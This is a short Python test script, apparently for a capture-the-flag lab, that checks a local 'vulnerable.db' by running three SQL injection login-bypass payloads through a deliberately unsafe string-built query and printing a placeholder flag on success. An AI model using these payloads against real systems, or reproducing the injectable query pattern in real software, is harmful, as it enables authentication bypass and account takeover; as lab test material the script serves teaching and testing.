#!/usr/bin/env python3
"""
Test script to verify SQLi payload works and debug issues
"""
import sqlite3
import sys

# Check if vulnerable.db exists and has users
try:
    conn = sqlite3.connect('vulnerable.db')
    conn.row_factory = sqlite3.Row
    cursor = conn.cursor()
    
    # Check table exists
    cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='users';")
    table = cursor.fetchone()
    if not table:
        print("❌ ERROR: 'users' table does not exist!")
        sys.exit(1)
    
    # List all users
    print("📋 Users in database:")
    cursor.execute("SELECT id, username, password, is_admin FROM users;")
    users = cursor.fetchall()
    for user in users:
        print(f"  ID: {user['id']}, Username: {user['username']}, Admin: {user['is_admin']}")
    
    if not users:
        print("❌ No users found! Database may be empty.")
        sys.exit(1)
    
    # Test the vulnerable query with payload
    print("\n🔍 Testing SQL Injection payloads:")
    
    payloads = [
        ("' OR '1'='1' -- ", ""),
        ("admin'--", "anything"),
        ("' OR '1'='1", "' OR '1'='1"),
    ]
    
    for username, password in payloads:
        query = f"SELECT * FROM users WHERE username='{username}' AND password='{password}'"
        print(f"\n  Query: {query}")
        try:
            cursor.execute(query)
            result = cursor.fetchone()
            if result:
                print(f"  ✅ SUCCESS: User found - {result['username']} (Admin: {result['is_admin']})")
                if result['is_admin']:
                    print(f"  🚩 FLAG would display: FLAG{{sql_injection_bypass_123}}")
            else:
                print(f"  ❌ No user returned")
        except Exception as e:
            print(f"  ❌ Query error: {e}")
    
    conn.close()
    print("\n✅ Database test complete!")
    
except Exception as e:
    print(f"❌ Fatal error: {e}")
    sys.exit(1)
